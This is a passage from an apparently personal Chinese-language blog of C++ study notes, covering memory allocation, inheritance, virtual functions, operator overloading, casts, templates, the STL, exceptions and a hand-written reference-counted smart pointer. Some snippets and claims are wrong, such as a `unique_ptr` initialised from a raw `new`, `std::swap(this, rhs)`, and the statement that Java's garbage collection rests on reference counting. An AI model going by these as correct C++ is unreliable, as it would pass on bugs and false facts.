    delete pa;
    delete []parr;
    delete []pstr;      //没有把16传递进去，怎么知道要清理几次呢？
}
</code></pre>
<p><img src="https://reticenceji.github.io/post-images/1615198175254.jpeg" alt="img" /></p>
<p>在64位系统中前面开辟8字节</p>
<p>所以我们有两种方式创建一个Object：一个是new，另一个是用RAII（资源获取即初始化）。他们的区别在于：</p>
<ol>
<li>new出来的东西是存在heap中的。自己new出来的东西自己要去delete/delete[]。</li>
<li>RAII的内容保存在栈上。这样，当函数结束，变量生命周期结合素，堆栈被释放，析构函数会被编译器自动调用。或者更准确的说，在C++中，一个被<code>{}</code>包裹的部分是一个automatic storage。当<code>{}</code>内的语句执行完成后，里面的资源被自动释放。这通常是<strong>最佳实践</strong>。不过你懂得，有时候还是要用heap的，比如大量内容的保存和更长的生命周期。这个时候我们最好用<strong>智能指针</strong>。</li>
</ol>
<pre><code class="language-cpp">#include &lt;iostream&gt;
class Vector
{
    private:
        int num;
    public:
        Vector(int s):num(s){
            std::cout &lt;&lt; &quot;Vector Constructor&quot; &lt;&lt; std::endl;
        }
};
int main()
{
    Vector arrow = Vector(2);				//RAII
    Vector* arrow_stack = &amp;arrow;	
    Vector* arrow_heap = new Vector(2); 	//new
    return 0;
}
</code></pre>
<p>看Allocator代码才知道new还有别的用法：</p>
<ol>
<li>
<p>基本的new：<code>A *obj = new A();</code> 使用 new 创建对象，分配了空间并调用了构造函数。其实 C++ 规定 new 的这两个功能分开实现：</p>
<ol>
<li>分配空间： 调用函数 operator new 来实现。</li>
<li>调用构造函数： 调用 placement new 来实现。</li>
</ol>
</li>
<li>
<p>operator new 如<code>::operator new(sizeof(T)*n)</code>，这个就是单纯的分配空间</p>
</li>
<li>
<p>placement new 的功能就是 在一个 <strong>已经分配好的空间上</strong>，调用构造函数，创建一个类。</p>
<pre><code class="language-cpp">void *buf = // 在这里为buf分配内存
Class *pc = new (buf) Class(); 
</code></pre>
</li>
</ol>
<p>与之对应的也有不同的delete</p>
<ol>
<li>基本的delete，先调用析构函数然后释放空间</li>
<li>operator delete，和operator new对应，释放分配的空间<code>::operator delete(buffer)</code></li>
<li>不需要和placement new对应的delete，直接调用析构函数就行了</li>
</ol>
<h2 id="default-arguments"><a class="header" href="#default-arguments">Default Arguments</a></h2>
<p>默认参数，在<strong>函数原型</strong>的时候为形参分配默认参数。如<code>void showArea(double length = 20.0, double width = 10.0);</code>。编译器如果发现你提供的参数少了，就会帮你把默认参数传进去。所以在<strong>函数定义</strong>的时候不需要说默认参数。另外，默认参数的位置必须在右边。默认参数是<strong>不推荐使用</strong>的，最佳的工程实践应该是用函数重载来实现这个功能。</p>
<h2 id="overload"><a class="header" href="#overload">Overload</a></h2>
<p>相同的函数名，但是不同的<strong>函数传入参数类型</strong>。然后编译器会给每一个函数分配一个唯一的奇怪的名字（取决于具体的编译器）。 另外，C++中的函数签名(function signature)：包含了一个函数的信息，包括函数名、参数类型、参数个数、顺序以及它所在的类和命名空间。</p>
<p>函数的重载是一种<strong>静态的多态性</strong>。编译器会帮你选择正确的（参数表和传入参数类型最匹配）函数。</p>
<p>有时候，你传入的参数类型让编译器无法抉择应该使用哪一个函数，就会报错。最佳的工程实践，应该是让传入的参数和函数参数表完全匹配，而不是依赖编译器的隐式转换。</p>
<p>子类会隐藏父类的所有同名函数，即使参数不同。</p>
<h2 id="inheritance-privateprotectpublic"><a class="header" href="#inheritance-privateprotectpublic">Inheritance-private,protect,public</a></h2>
<p>如果两个对象是继承关系，那么子类是父类更特殊的推广。经常举的例子是<code>Shape</code>和<code>Rectangle</code>。</p>
<pre><code class="language-cpp">class Derived : public Base
{
    //会把Base Class中所有的方法、变量都继承下来，包括构造函数、析构函数
    //Base Class中的private方法，对于Derived Class也不能访问，			还有friends
    //protected方法，对于Derived Class可以访问，但是对外部来说是不可见的，	 还有friends
    //public方法，都可以访问
}
</code></pre>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">Public继承中的Accessibility</th><th style="text-align: left">private members</th><th style="text-align: left">protected members</th><th style="text-align: left">public members</th></tr></thead><tbody>
<tr><td style="text-align: left">Base Class</td><td style="text-align: left">Yes</td><td style="text-align: left">Yes</td><td style="text-align: left">Yes</td></tr>
<tr><td style="text-align: left">Derived Class</td><td style="text-align: left">No</td><td style="text-align: left">Yes</td><td style="text-align: left">Yes</td></tr>
<tr><td style="text-align: left">Outer</td><td style="text-align: left">No</td><td style="text-align: left">No</td><td style="text-align: left">Yes</td></tr>
</tbody></table>
</div>
<p>我们要初始化基类的内容要怎么办呢？最佳实践是在初始化列表中加入基类</p>
<pre><code>123事实上，我们会先调用Base的构造函数，再调用Derived的构造函数;
构造函数中初始化的顺序取决于变量定义的，顺序而不是初始化列表的顺序。
Derived(value,...): attr(value), Base(...) {};
</code></pre>
<p><strong>Name hiding</strong>：如果在Derived Class编写了一个函数，那么Base Class中所有的同名函数都会<strong>被隐藏</strong>，即使参数列表不同。如果需要调用的话，要用<code>Base::function</code>显式声明要调用的函数。</p>
<p><code>friend</code>关键字。可以用用他来指定可以作为friend的东西，被friend修饰的东西就可以访问private的东西了。他是破坏了封装的准则的，要慎用。</p>
<pre><code class="language-cpp">//class 默认是private, struct默认是public
struct X{
private:
    int i;
public:
    friend struct Z;		//可以是某个变量
	friend void Fri::h();	//可以是别的类的函数
	friend void glo();		//可以是全局函数
}
   
</code></pre>
<p>最开始的例子可以猜到，其实继承也是有public, private, protected 之分的。但是一般用的都是public，后面两个基本上不怎么用。</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">继承方式</th><th style="text-align: left">基类的public成员</th><th style="text-align: left">基类的protected成员</th><th style="text-align: left">基类的private成员</th><th style="text-align: left">继承引起的访问控制关系变化概括</th></tr></thead><tbody>
<tr><td style="text-align: left">public继承</td><td style="text-align: left">仍为public成员</td><td style="text-align: left">仍为protected成员</td><td style="text-align: left">不可见</td><td style="text-align: left">基类的非私有成员在子类的访问属性不变</td></tr>
<tr><td style="text-align: left">protected继承</td><td style="text-align: left">变为protected成员</td><td style="text-align: left">变为protected成员</td><td style="text-align: left">不可见</td><td style="text-align: left">基类的非私有成员都为子类的保护成员</td></tr>
<tr><td style="text-align: left">private继承</td><td style="text-align: left">变为private成员</td><td style="text-align: left">变为private成员</td><td style="text-align: left">不可见</td><td style="text-align: left">基类中的非私有成员都称为子类的私有成员</td></tr>
</tbody></table>
</div>
<p>另外，在继承中，构造函数调用顺序：先基类，后子类；析构函数调用顺序：先子类，后基类。</p>
<div class="table-wrapper"><table><thead><tr><th>-</th><th>作用域</th><th>函数名</th><th>参数</th><th>返回值</th></tr></thead><tbody>
<tr><td>重载</td><td>相同</td><td>相同</td><td>不同</td><td>不影响</td></tr>
<tr><td>覆盖</td><td>子类和父类</td><td>相同</td><td>相同</td><td>相同</td></tr>
<tr><td>隐藏</td><td>重叠（包括子类和父类）</td><td>相同</td><td>不同</td><td>不影响</td></tr>
</tbody></table>
</div>
<p>多继承：<strong>别用</strong>，除非是全是虚函数的接口。</p>
<h2 id="polymorphism-virtual-function"><a class="header" href="#polymorphism-virtual-function">Polymorphism-virtual function</a></h2>
<p>https://bbs.pediy.com/thread-221160.htm</p>
<p>通过添加这个<code>virtual</code>，我们可以只用<code>foo</code>方便的调用到每个类型上正确的函数。virtual的意思是：<strong>当通过基类的指针或者引用调用该成员函数时，将根据指针指向的对象类型确定调用的函数，而非指针的类型。</strong></p>
<p>可以试着把virtual去掉，会发现调用的都是<code>Shape.render()</code>，是一个静态绑定。另外，实际上我们只需要在基类上写上virtual。</p>
<p>如果一个类有虚函数，编译器会自动为<strong>这个类型的对象在头部增加一个虚表指针（<code>vftable</code>）</strong>，指向虚函数表。虚函数表中存放着一个个的虚函数的地址。每一个类的实例上都多了一个虚表，增加内存代价，然后调用的时候也多了一层，间接调用。</p>
<p>注意，<code>base = derive</code>是合法的，但是这个copy是不会把上面提到的<code>vptr</code>复制过去的，所以<code>base.xxx</code>调用的还是基类的方法。</p>
<p>记住一个点，如果想利用多态性的话，基类的<strong>析构函数必须是virtual的</strong>。为什么呢？因为否则的话你用基类指针接住子类，调用这个指针指向的析构函数如果没有virtual的帮助的话会调用基类析构函数而不是本来应该调用的子类析构函数。你不要假设类的使用者不会这么做，你会很痛苦的。</p>
<pre><code class="language-cpp">class Shape{
public:
    virtual void render() = 0;	//纯虚函数
    virtual ~Shape() {...}		//基类的析构函数肯定是virtual的。
}
class Ellipse : public Shape {
public:
    void render() override{...}
}
class Circle : public Ellipse{
public:
    void render() override{ 
        Shape::render();		//重用父类的代码
        ...
    }
}

void foo(Shape* ptr){
    ptr-&gt;render();
}

int main(){
    Ellipse e;
    Circle c;
    foo(&amp;c);
    foo(&amp;e);
}
//离开作用域后会调用c,e的虚构函数，应该是编译器帮我们加上的，在出栈的时候？
//智能指针 unique_ptr 可以帮你管理内存
</code></pre>
<p><strong>纯虚函数</strong>：比如上面的Shape，它其实是一个抽象的概念，我们没法实现他的render。我们不应该去写他，所以我们把他变成一个纯虚函数。有纯虚函数的类，是<strong>抽象类</strong>，是不能实例化的。纯虚函数的子类应该去实现纯虚函数，否则也不能实例化。</p>
<p>类型转换 Up-casting</p>
<pre><code>Derive 	Base
Derive&amp;=&gt;Base&amp;
Derive*=&gt;Base*
</code></pre>
<p>动态绑定和静态绑定</p>
<p>关于继承和虚函数的底层实现内存布局，在另一篇<a href="Basic/C/">Blog C++Q&amp;A</a>中有解释。</p>
<h2 id="operator-overloading"><a class="header" href="#operator-overloading">operator overloading</a></h2>
<p>可以重载的运算符。不过优先级是无法改变的，<strong>操作数个数</strong>(如果是member function要算上this)也是无法改变的。也就是说我们应该尽量维持他们的语义。如果C++中本身不存在的运算符也是无法添加的。</p>
<div class="table-wrapper"><table><thead><tr><th>+</th><th>-</th><th>*</th><th>/</th><th>%</th><th>^</th></tr></thead><tbody>
<tr><td>&amp;</td><td>|</td><td>~</td><td>!</td><td>,</td><td>=</td></tr>
<tr><td>&lt;</td><td>&gt;</td><td>&lt;=</td><td>&gt;=</td><td>++</td><td>--</td></tr>
<tr><td>&lt;&lt;</td><td>&gt;&gt;</td><td>==</td><td>!=</td><td>&amp;&amp;</td><td>||</td></tr>
<tr><td>+=</td><td>-=</td><td>/=</td><td>%=</td><td>^=</td><td>&amp;=</td></tr>
<tr><td>|=</td><td>*=</td><td>&lt;&lt;=</td><td>&gt;&gt;=</td><td>[]</td><td>()</td></tr>
<tr><td>-&gt;</td><td>-&gt;*</td><td>new</td><td>new []</td><td>delete</td><td>delete []</td></tr>
</tbody></table>
</div>
<p>运算符重载的本质就是函数重载，<code>operator运算符()</code>。</p>
<pre><code class="language-cpp">// 第一种写法，写成member function。
// 推荐单目运算符使用，[] () = 必须用
// 后面的const表示函数是一个常量函数，不会更改this的状态
Complex operator+ (Complex const &amp;obj) const{
    Complex res;
    res.real = this-&gt;real + obj.real;
    res.imag = this-&gt;imag + obj.imag;
    return res;
}
语义： x+y ===&gt; x.operator+(y)
    
// 第二种写法，写成global function，没有了默认的self变量
// 推荐双目运算符使用，看起来清楚一点
// 要访问类内部的数据，所以用上了friend
// 通过friend修饰可以访问私有变量
class Complex {
private:
    int real, imag;
public:
    Complex(int r = 0, int i =0)  {real = r;   imag = i;}
    friend Complex operator+ (Complex const &amp;, Complex const &amp;);
}
Complex operator+ (Complex const &amp;c1, Complex const &amp;c2)
{
    return Complex(c1.real + c2.real, c1.imag + c2.imag);
}
语义： x+y ===&gt; operator+(x,y)
</code></pre>
<p>注意：</p>
<ul>
<li><code>E&amp; T::operator[] (int index)</code>返回的是引用</li>
<li><code>++</code>和<code>--</code>让人迷惑。<code>T&amp; operator++()</code>是prefix++，<code>T operator++(int)</code> 是postfix++。这个int是一个占位符。</li>
<li>运算符之间往往是联系很大的，你要合理的重用他们避免代码重复。比如<code>!=</code>和<code>==</code>，<code>&gt;</code>和<code>&lt;=</code>，<code>&lt;</code>和<code>&gt;=</code>；<code>+=</code>和<code>++</code>。</li>
<li>类型强制转换运算符是单目运算符，也可以被重载，但只能重载为成员函数，不能重载为全局函数。<code>operator double();</code>这是一个对double强制类型转换的重载。</li>
<li>赋值运算符<code>=</code>，Be sure to assign to all data members: pointers... Checkfor <strong>self-assignment</strong><code>if (this!= &amp;rhs)</code>.</li>
</ul>
<h2 id="stream"><a class="header" href="#stream">stream</a></h2>
<p>C语言其实已经有完善的I/O了，那么我们为什么还需要stream呢？</p>
<ol>
<li>stream是类型安全的。</li>
<li>可以对自己定义的类，重载流输入输出符号。可扩展性高。</li>
<li>更加面向对象。</li>
</ol>
<p>但是对格式化输出不友好(std::format comes back in C++20,但是还没有编译器支持；有很多第三方库也支持格式化输出)。流可能会更慢。</p>
<div class="table-wrapper"><table><thead><tr><th></th><th>Input</th><th>Output</th><th>Header</th></tr></thead><tbody>
<tr><td>Generic</td><td>istream</td><td>ostream</td><td>iostream</td></tr>
<tr><td>File</td><td>ifstream</td><td>ofstream</td><td>ifstream</td></tr>
<tr><td>C string</td><td>istrstream</td><td>ostrstream</td><td>strstream</td></tr>
<tr><td>C++ string</td><td>istringstream</td><td>ostringstream</td><td>sstream</td></tr>
</tbody></table>
</div>
<p>Extractor<code>&gt;&gt;</code>, Inserter<code>&lt;&lt;</code>, <strong>Manipulator</strong>.</p>
<p><code>&lt;&lt;</code>：对于基本类型都已经定义好了。默认是忽略前导的whitespace的。我们可以为我们的类型自己重载这个运算符。<code>&gt;&gt;</code>也是。</p>
<pre><code class="language-cpp">// 声明 通过friend可以访问私有变量
friend std::ostream &amp;operator&lt;&lt;(std::ostream &amp;output, const Fraction &amp;D);
friend std::istream &amp;operator&gt;&gt;(std::istream &amp;input, Fraction &amp;D);
// 定义，注意这个不是类方法，是没有默认的self变量的
std::istream &amp;operator&gt;&gt;(std::istream &amp;input, Fraction &amp;D)
{
    input &gt;&gt; D.numerator &gt;&gt; D.denominator;
    return input;
}

std::ostream &amp;operator&lt;&lt;(std::ostream &amp;output, const Fraction &amp;D)
{
    output &lt;&lt; D.to_string();
    return output;
}

// 自定义Manipulator的例子
ostream&amp; tab(ostream&amp; out){
    return out &lt;&lt; '\t';
}
</code></pre>
<p>除了流，我们还有更精细的对输入的控制：</p>
<ul>
<li>其他的函数
<ul>
<li><code>get()</code></li>
<li>``getline()`</li>
<li>cout.flash()`：刷新缓冲区，会把缓存中的东西都写出去。</li>
</ul>
</li>
<li>manipulator可以控制流的状态。我们也可以自定义manipulator。
<ul>
<li>endl：换行，刷新缓冲区</li>
<li>hex：</li>
<li>setprecision(2)：控制输出的精度</li>
<li>setw(20)：</li>
</ul>
</li>
<li>stream flag</li>
</ul>
<h2 id="composition"><a class="header" href="#composition">composition</a></h2>
<p>表示“has a”的关系。比如car has a engin/windows
一个优秀的composition应该满足</p>
<ul>
<li>The part (member) is part of the object (class)</li>
<li>The part (member) can only belong to one object (class) at a time</li>
<li>The part (member) has its existence managed by the object (class)</li>
<li>The part (member) does not know about the existence of the object (class)
包含的方法，通过对象是不是能管理包含内容的生命周期决定要选择哪一种：A has a B</li>
</ul>
<ol>
<li>直接包含。A和B的生命周期相同。A的析构函数会调用被包含的B的析构函数。A会按照和声明相反的顺序调用members的析构函数。</li>
<li>通过指针。那么我们需要通过析构函数手动的释放B。显然这个更复杂。所以我们在需要动态的分配的时候才会通过指针。当然，我们还有智能指针呢。</li>
</ol>
<h3 id="抽象类型"><a class="header" href="#抽象类型">抽象类型</a></h3>
<p>抽象类型( abstract type ) 则把使用者与类的实现细节完全隔离开来。</p>
<h2 id="类型转换"><a class="header" href="#类型转换">类型转换</a></h2>
<p>对于单参数的构造函数，可能会做隐式类型转换。<code>A a = b</code>被转换成<code>A a=A(b)</code>。想要避免这个现象，可以在<strong>单参数构造函数</strong>前加上<code>explicit</code>关键字。</p>
<p>内置的隐式类型转换：</p>
<pre><code>char=&gt;short=&gt;int=&gt;float=&gt;double
           =&gt;int=&gt;long
T=&gt;T&amp;
T&amp;=&gt;T
T*=&gt;void*
T[]=&gt;T*
T*=&gt;T[]
T=&gt;const T
</code></pre>
<p>可以自己重载类型转换。<code>X::operator T()</code>，Compiler will use it as a type conversion from X=&gt;T.</p>
<p>另外注意以下C++赋值的<strong>默认语义是copy</strong>而Rust是move，二者是有很大区别的。而这也会带来很多很微妙的问题，比如一个析构函数对应了有 复制构造函数、构造函数，C++11引入了移动构造函数但是我不知道什么时候会被调用。这样的话类里头有指针就很容易出问题，建议用智能指针RAII。</p>
<p>C++提供了四个有语义的类型转换：</p>
<ol>
<li>
<p><strong>static_cast</strong>: 它用于非多态类型的转换（静态转换），<strong>对应于C中的隐式类型转换</strong>，<strong>但他不能用于两个不相关类型的转换</strong>，如整形和整形指针之间的转换，虽然二者都是四个字节，但他们一个表示数据，一个表示地址，类型不相关，无法进行转换。</p>
<p>不能在没有派生关系的两个类类型之间转换</p>
<p>不能去除掉原有类型的类型修饰符，例如<code>const</code>，<code>volatile</code>，<code>__unaligned</code></p>
<p>转换对象时由于没有动态类型检查，所以由基类对象转换成派生类对象的时候存在安全隐患</p>
</li>
<li>
<p><strong>reinterpret_cast</strong>: 重新解释，可将一种类型转换成另一种不相关类型，<strong>对应C中的强制类型转换</strong>，处理无法进行隐式转换的情况</p>
</li>
<li>
<p><strong>const_cast</strong>: 他的功能就是删除变量的const属性，方便再次赋值。该转换在编译时完成，用于解除const，volatile修饰符，只能转换指针或者引用。</p>
</li>
<li>
<p><strong>dynamic_cast</strong>: 有条件转换，动态类型转换，将一个基类对象指针（或引用）转换到继承类指针，dynamic_cast会根据基类指针是否真正指向继承类指针来做相应处理，运行时检查类型安全（转换失败返回nullptr）：</p>
<p>1）安全的基类和子类之间的转换。</p>
<p>2）必须有虚函数。</p>
<p>3）相同基类不同子类之间的交叉转换，但结果返回nullptr。</p>
</li>
</ol>
<pre><code class="language-cpp">// C++提供了4个有语义的类型转换
double d = 7.1;
int a;
a = d;				// implicit
a = (int) d;		// explicit
a = static_cast&lt;int&gt;(d);	

double *pd = reinterpret_cast&lt;double*&gt;(&amp;a);	//并不改变底层的二进制
const_cast&lt;&gt;();

// 下面假设A是基类，BC继承A
A* pa = new B;
C *pc = dynamic_cast&lt;C*&gt;(pa);	// 依赖于虚表，返回nullptr
</code></pre>
<h2 id="template"><a class="header" href="#template">Template</a></h2>
<p>泛型编程的基础。广泛的的在标准库中使用。有点以类型作为参数的感觉，和重载有时能完成同样的事情。或者说，通过模板编译器能帮我们自动生成重载的函数。</p>
<ul>
<li>Function template <code>sort</code>...</li>
<li>Class template <code>stack</code>,<code>list</code>,...</li>
</ul>
<p>Demo: Function template</p>
<pre><code class="language-cpp">// 交换函数，只能是Int
void my_swap(int&amp; x,int&amp; y){
        int temp = x;
        x = y;
        y = temp;
}
void my_swap(string&amp; x,string&amp; y){
        string temp = x;
        x = y;
        y = temp;
}

// 这样子就可以为所有的类型做swap
// 当我们实际上用int类型调用的时候，编译器会帮我们生成和上面第一种一样的代码 swap(int,int)
// 但是如果你调用swap(double,int)就不行，编译器不会做默认的隐式转换 除非你显式的调用swap&lt;double&gt;(double, int)
template &lt;typename T&gt;
void my_swap(T&amp; x,T&amp; y){
        T temp = x;
        x = y;
        y = temp;
}

// 如果编译器无法在传入参数和返回值中判断出类型，你需要显式的调用模板函数my_fun&lt;double&gt;()
template &lt;typename T&gt;
void my_fun(){
    T ...
}
</code></pre>
<p>模板和普通函数是可以共存的，并且在参数匹配的时候会优先选择普通函数。当然我觉得这个一般是没啥用的。</p>
<p>Overload rules：</p>
<ol>
<li>参数完全匹配的普通函数</li>
<li>参数完全匹配的模板函数</li>
<li>可以通过隐式转换匹配的普通函数</li>
</ol>
<p>Demo: class template</p>
<pre><code class="language-cpp">template &lt;class T&gt;
class Vector {
    Vector(int size);
    ...
}

Vector&lt;T&gt;::Vector(int size) :m_size(size){
    m_element = new T[m_size];
}
...
    
int main(){
    	vector&lt;int&gt; x = vector&lt;int&gt;(100);
}

// Template可以有多个泛型
template &lt;class Key,class Value&gt;
class HashTable{
    ...
}

// template还可以带参数，不过参数一定要在编译期就能确定值。
template &lt;class T,int N&gt;
class Array{
    private T my_arr[N];
    ...
}
Array&lt;int ,3&gt;a;
</code></pre>
<p>[!] 其实我们写了一个模板T，<strong>并不是放之四海而皆能编译</strong>的。因为可能对泛型T是有要求的。看一个rust的例子：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn sort(&amp;mut self)
where
    T: Ord,				//如果要排序的话，T要是实现了Ord Trait的。偏序比较。
<span class="boring">}
</span></code></pre></pre>
<p>对应C++，可能就是要重载<code>&lt;</code>号之类的比较符号。这个错误在C++是非常隐晦的，C++20提出了和上面的Rust类似的解决方案。</p>
<p>[!] 歧义递归模板</p>
<div class="table-wrapper"><table><thead><tr><th></th><th><a href="http://www.cnblogs.com/ider/archive/2011/06/30/what_is_in_cpp_header_and_implementation_file.html#none_template_type">非模板类型(none-template)</a></th><th><a href="http://www.cnblogs.com/ider/archive/2011/06/30/what_is_in_cpp_header_and_implementation_file.html#none_template_type">模板类型(template)</a></th></tr></thead><tbody>
<tr><td><a href="http://www.cnblogs.com/ider/archive/2011/06/30/what_is_in_cpp_header_and_implementation_file.html#header_file">头文件(.h)</a></td><td>全局变量申明（带extern限定符）全局函数的申明带<a href="http://www.cnblogs.com/ider/archive/2011/06/30/what_is_in_cpp_header_and_implementation_file.html#inline_qualifier">inline限定符</a>的全局函数的定义</td><td>带<a href="http://www.cnblogs.com/ider/archive/2011/06/30/what_is_in_cpp_header_and_implementation_file.html#inline_qualifier">inline限定符</a>的全局模板函数的申明和定义</td></tr>
<tr><td>类的定义类函数成员和数据成员的申明（在类内部）类定义内的函数定义（相当于inline）带<a href="http://www.cnblogs.com/ider/archive/2011/06/30/what_is_in_cpp_header_and_implementation_file.html#static_const_qualifier">static const限定符</a>的数据成员在<strong>类内部</strong>的初始化带<a href="http://www.cnblogs.com/ider/archive/2011/06/30/what_is_in_cpp_header_and_implementation_file.html#inline_qualifier">inline限定符</a>的类定义外的函数定义</td><td>模板类的定义模板类成员的申明和定义（定义可以放在类内或者类外，类外不需要写inline）</td><td></td></tr>
<tr><td>实现文件(.cpp)</td><td>全局变量的定义（及初始化）全局函数的定义</td><td>(无)</td></tr>
<tr><td>类函数成员的定义类带static限定符的数据成员的初始化</td><td></td><td></td></tr>
</tbody></table>
</div>
<h2 id="stl-standard-template-library"><a class="header" href="#stl-standard-template-library">STL (standard template library)</a></h2>
<p>已经写好的数据结构，robust，portable，easy。泛型编程。</p>
<ul>
<li>Containers: pair,vector,deque,list,set,map</li>
<li>Algotithm: sort() copy() find()</li>
<li>Iterators: begin() end() 不要对无效的迭代器进行任何操作！<code>li=L.erase(li)</code></li>
</ul>
<p>最常用的三个数据结构：map，vector，list</p>
<p><img src="Basic/C/../images/image-20210605203121551.png" alt="image-20210605203121551" /></p>
<p><img src="Basic/C/../images/image-20210605203530117.png" alt="image-20210605203530117" /></p>
<p>然后因为这些东西加上泛型比较冗长，所以我们一般会用：</p>
<ol>
<li>typedef <code>typedefPBmap&lt;Name,list&lt;PhoneNum&gt;&gt;</code></li>
<li>auto 来自动推导类型（C++11）</li>
</ol>
<h2 id="iterators"><a class="header" href="#iterators">Iterators</a></h2>
<p>要理解泛型编程，一定要理解的是泛型和迭代器。</p>
<p>迭代器是<strong>容器和算法</strong>之间的粘合剂。模板让算法独立于存储的数据类型，迭代器让算法独立于使用的容器类型。迭代器提供了一个和底层实现无关的。</p>
<p>STL为每个容器类型都实现了迭代器，无论他们底层是如何实现的，都有类似的基本接口。我觉得迭代器就像一个<strong>有额外metadata的指针</strong>，能用在指针上面的操作基本都能用在迭代器上，比如<code>*</code>,<code>++ --</code>,<code>[]</code>,<code>==</code>等。不过迭代器有的是<strong>单向</strong>（不支持<code>--</code>和<code>[]</code>）的，有的是<strong>双向</strong>（支持<code>++</code>和<code>--</code>）的，有的是支持<strong>随机访问RandomAccessIterator</strong>（支持<code>[]</code>）的。（这个也好理解，比如单向链表如果要逆向访问代价就很大了；如果内存中连续的话，随机访问问题也不大）。指针变量可以理解为数组的迭代器。</p>
<p>除此之外还有<strong>输入迭代器InputIterator</strong>和<strong>输出迭代器</strong>的区别，输入迭代器可以让我们解引用<code>*</code>但是我们不能修改内容。输出迭代器只能让我们写容器的值而不能读取。比如cout就是输出迭代器。</p>
<p>遍历<code>for (auto it = con.begin(); it!=con.end(); it++){}</code>。不过++得到的结果和底层的实现有关，比如<code>set</code>的底层实现是红黑树，所以<code>set</code>内部的元素是有序的，<code>++</code>会获得中序遍历的下一个值（也就是从小到大）；<code>vector</code>在内存中是有序的，<code>++</code>就会获得内存中相邻的下一个元素。</p>
<p>迭代器至少要重载<code>*</code>，<code>-&gt;</code>，<code>==</code>操作吧。可能<code>++</code>等算数符号至少也要实现一个的。这些接口定义好了，就可以用算法库了。</p>
<p>迭代器里面往往会定义一些类型信息，方便外部的使用</p>
<pre><code class="language-cpp">template &lt;class T&gt;
struct myIter{
	typedef T value_type;    
    
    T* ptr;
    ...
}
</code></pre>
<h2 id="exception"><a class="header" href="#exception">Exception</a></h2>
<p>throw try catch</p>
<p><code>new</code> raise <code>bad_alloc()</code>exception on failure</p>
<p>如果在<strong>构造函数中发生了异常</strong>，那么析构函数不会执行。所以如果你在构造函数里头有new的话，内存就泄漏了。解决办法是啥呢？智能指针永远的神，或者说用另一个对象Wrapper给他包起来，这就是RAII！总之最好不要有一个裸指针，太难了。</p>
<pre><code class="language-cpp">// Wrapper就是把指针封装起来，可以是简单的像Rust中Box一样的东西，也可以是其他的智能指针unique_ptr和shared_ptr
class Wrapper{

}

class A{
private:
    Wrapper w;
    // 或者 unique_ptr&lt;int[]&gt; w;
public:
    A() :w(new int[10]){
        cout &lt;&lt; &quot;A::A()&quot; &lt;&lt; endl;
        throw 1;	// 为了演示
    }
    ~A() {
        cout &lt;&lt; &quot;A::~A()&quot; &lt;&lt; endl;
    }
}
</code></pre>
<p>如果在析构函数发生了异常。。那就完了，不要让他抛异常。</p>
<pre><code class="language-c++">// 关于执行顺序
// 一旦try里面发生了异常，会从上到下依次检查是否有匹配的catch块。
// 一旦匹配了，执行catch块的内容
// 如果没有匹配
// 如果try里面没有发生异常
// 继续执行，直到函数return(并没有真正返回，算出了返回值)
// 执行finally块的内容
// 函数返回
int[] arr = new int[5];
double b = 0;

try{
    arr[6] = 8;
}
catch (ArrayIndexOutOfBoundsException ex){
    System.out.println(&quot;----&quot;);
    b = 1/0;
}catch (Exception e){
    System.out.println(&quot;****&quot;);
    e.printStackTrace();
}finally {
    arr[4] = 3;
    System.out.println(arr[4]);
}
</code></pre>
<p>C++ 标准库中有一些类代表异常，这些类都是从 exception 类派生而来的。一般来说我们尽量使用标准库的异常，不要自己定义异常类，虽然我们可以throw任何类实例。更一般来说，尽量不要让程序可能抛出异常。</p>
<h3 id="智能指针-1"><a class="header" href="#智能指针-1">智能指针</a></h3>
<p>C++智能指针，<code>unique_ptr</code>，<code>shared_ptr</code>，<code>weak_ptr</code></p>
<p>基本的使用方法<code>unique_ptr&lt;A&gt; pa = new(A);</code>，C++11。最好的使用方法：<code>auto pa = make_unique&lt;A&gt;();</code>，括号里可以写A构造函数的参数，不过这个是C++14支持的。 unique_ptr是独占式指针，意味着<code>auto pa2 = pa;</code>等复制语义的语句是不被允许的，编译器会告诉你copy constructor/ copy assignment constructor都被删除了。<code>std::move)()</code>移动语义是被允许的。<code>pa.get()</code>可以把裸指针拿出来，虽然<code>pa</code>的使用和裸指针基本一样。</p>
<p>类似的，<code>auto pa = make_shared&lt;A&gt;();</code>。顾名思义是允许多个指针指向内容，是由引用计数实现的。我们可以用<code>pa.use_count()</code>查看引用计数。shared_ptr有一个问题，就是一旦发生了<strong>循环引用</strong>，就不会释放，造成内存泄漏。Java/Python的垃圾回收基本原理也是引用计数。</p>
<p><code>weak_ptr</code>和<code>shared_ptr</code>是很类似的，但是weak_ptr是没有管理的所有权的。他就不会关系管理的类的构造和析构。</p>
<pre><code class="language-cpp">//  引用计数器类  用于存储指向同一对象的指针数
template&lt;typename T&gt;
class Counter
{
private:
	//  数据成员
	T* ptr;    //  对象指针
	int cnt;   //  引用计数器
	//  友元类声明
	template&lt;typename T&gt;
	friend class SmartPtr;
	//  成员函数
	//  构造函数
	Counter(T* p)   //  p为指向动态分配对象的指针
	{
		ptr = p;
		cnt = 1;
	}
	//  析构函数
	~Counter()
	{
		delete ptr;
	}
};

//  智能指针类  
template&lt;typename T&gt;
class SmartPtr
{
private:
	//  数据成员
	T* ptr;
	Counter&lt;T&gt;* ptr_cnt;

public:
	//  普通构造函数  初始化计数类
	SmartPtr(T* p) : ptr(p), ptr_cnt(new Counter&lt;T&gt;(p))
	{
	}
	//  拷贝构造函数
	SmartPtr(const SmartPtr&amp; other) : ptr(other.ptr), ptr_cnt(other.ptr_cnt)
	{
		ptr_cnt-&gt;cnt++;
	}
	//  移动构造函数
	SmartPtr(SmartPtr&amp;&amp; other) : ptr(std::move(other.ptr)), ptr_cnt(std::move(other.ptr_cnt))
	{
		other.ptr_cnt = nullptr;
	}

	//  赋值重载
	SmartPtr&amp; operator=(const SmartPtr&amp; rhs)
	{
		if (ptr_cnt != rhs.ptr_cnt)
		{
			if (ptr_cnt != nullptr)
			{
				ptr_cnt-&gt;cnt--;
				if (ptr_cnt-&gt;cnt == 0)
					delete ptr_cnt;
			}
			ptr = rhs.ptr;
			ptr_cnt = rhs.ptr_cnt;
			rhs.ptr_cnt-&gt;cnt++;

		}
		return *this;
	}

	// 移动赋值重载	
	SmartPtr&amp; operator=(SmartPtr &amp;&amp; rhs)
	{
		if (ptr_cnt != rhs.ptr_cnt)
		{
			std::swap(this, rhs);
		}
